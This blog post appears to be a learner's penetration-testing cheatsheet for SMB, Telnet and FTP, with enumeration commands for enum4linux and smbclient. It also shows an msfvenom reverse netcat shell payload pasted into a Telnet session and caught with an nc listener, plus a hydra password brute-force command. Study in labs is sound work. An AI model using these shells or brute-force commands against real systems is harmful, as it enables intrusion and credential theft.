---
layout: post
title: Services list cheatsheet
subtitle: List of common services and their usual exploitation
cover-img: /assets/img/back.jpg
thumbnail-img: /assets/img/back.png
share-img: /assets/img/back.jpg
---
<style>
a.section {
    display: block;
    position: relative;
    top: -100px;
    visibility: hidden;
}
</style>

>Before everything: make a nmap scan for finding open and vulnerable ports.

# Table of contents

- [SMB](#SMB)
- [TELNET](#Telnet)
- [FTP](#FTP)

# SMB <a class="section" id="SMB"></a>

Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX. 

#### Enum4linux

It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.

```bash
SYNTAX = "enum4linux [options] ip"
    
OPTIONS:
 
 -U             get userlist
 -M             get machine list
 -N             get namelist dump (different from -U and-M)
 -S             get sharelist
 -P             get password policy information
 -G             get group and member list

 -a             all of the above (full basic enumeration)
```

#### Exploiting SMB
find vulnerabilities in <https://www.cvedetails.com/>

#### Using SMBCLIENT


```bash
SYNTAX: "smbclient //[IP]/[SHARE]"

Followed by: 

-U [name] : to specify the user

-p [port] : to specify the port

```
# Telnet <a class="section" id="Telnet"></a>
 
```bash
SYNTAX: "telnet [ip][port]"
```

#### Enumerating telnet
 
check:
<https://www.cvedetails.com> or
<https://cve.mitre.org>
for finding vulnerabilities.

Also, we can find an obvious misconfiguration that let us exploit it.
 
#### Connecting Telnet

```bash
SYNTAX: "telnet [ip] [port]"
```

In case we can`t see if we are executing what we type we can use **tcpdump**

```bash
"sudo tcpdump ip proto \\icmp -i tun0" //tun0 = network interface in use
```

We need to preface the commands in the telnet machine terminal with ".RUN" 
ex:

```bash
".RUN ping -c 1 [attackingMachine.localhost]" //we can use that command to see that we are correctly executing code
```
 
#### Generating a reverse shell payload (using msfvenom)
 
```bash
SYNTAX: "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
```
Where:
-p = payload
lhost = our local host IP address (this is your machine IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


Now we can use a netcat listener on our local machine:
```bash
"nc -lvp [listening port]" 
```

We just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we'll be able to use a shell through the listener previously deployed.
 
# FTP <a class="section" id="FTP"></a>
 
Standard FTP port = 21
 
#### Enumerating ftp
 
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.
 
Alternative Enumeration Methods

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that donâ€™t.
 
```bash
"ftp [IP]"
```

#### Exploiting FTP

If we have a possible username we can try to apply bruteforce using hydra.

```bash
"hydra -t 4 -l [USER] dale -P [PATH TO DICTIONARY] -vV [MACHINE IP] ftp"
```

PATH TO DICTIONARY in my case is: /usr/share/wordlists/passwords/rock-you05.txt

